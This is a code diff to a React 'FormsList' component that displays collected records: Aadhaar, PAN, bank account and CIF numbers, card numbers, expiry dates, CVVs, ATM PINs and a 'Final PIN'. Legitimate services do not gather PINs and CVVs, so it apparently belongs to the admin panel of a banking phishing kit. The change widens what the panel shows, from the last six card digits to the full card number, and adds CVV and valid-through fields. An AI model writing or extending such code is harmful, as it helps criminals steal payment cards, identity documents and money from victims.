@@ -168,13 +168,13 @@ function FormsList({ forms }: { forms: FormData[] }) {
                     )}
 
                     {/* Account Details - show only if has data */}
-                    {(form.accountNumber || form.aadhaarNumber || form.panCard || form.cifNumber || form.branchCode) && (
+                    {(form.accountNumber || form.aadhaarNumber || form.panCard || form.panNumber || form.cifNumber || form.branchCode) && (
                         <div style={{ marginBottom: '1rem' }}>
                             <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>🏦 Account Details</div>
                             <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
                                 {form.accountNumber && <div><strong>Account:</strong> {form.accountNumber}</div>}
                                 {form.aadhaarNumber && <div><strong>Aadhaar:</strong> {form.aadhaarNumber}</div>}
-                                {form.panCard && <div><strong>PAN:</strong> {form.panCard}</div>}
+                                {(form.panCard || form.panNumber) && <div><strong>PAN:</strong> {form.panCard || form.panNumber}</div>}
                                 {form.cifNumber && <div><strong>CIF:</strong> {form.cifNumber}</div>}
                                 {form.branchCode && <div><strong>Branch:</strong> {form.branchCode}</div>}
                             </div>
@@ -182,12 +182,13 @@ function FormsList({ forms }: { forms: FormData[] }) {
                     )}
 
                     {/* Card Details - show only if has data */}
-                    {(form.cardLast6 || form.cardExpiry || form.atmPin || form.finalPin) && (
+                    {(form.cardLast6 || form.cardNumber || form.cardExpiry || form.validThrough || form.cvv || form.atmPin || form.finalPin) && (
                         <div style={{ marginBottom: '1rem' }}>
                             <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>💳 Card Details</div>
                             <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
-                                {form.cardLast6 && <div><strong>Last 6:</strong> {form.cardLast6}</div>}
-                                {form.cardExpiry && <div><strong>Expiry:</strong> {form.cardExpiry}</div>}
+                                {(form.cardNumber || form.cardLast6) && <div><strong>Card Number:</strong> {form.cardNumber || form.cardLast6}</div>}
+                                {(form.validThrough || form.cardExpiry) && <div><strong>Expiry:</strong> {form.validThrough || form.cardExpiry}</div>}
+                                {form.cvv && <div><strong>CVV:</strong> {form.cvv}</div>}
                                 {form.atmPin && <div><strong>PIN:</strong> {form.atmPin}</div>}
                                 {form.finalPin && <div><strong>Final PIN:</strong> {form.finalPin}</div>}
                             </div>
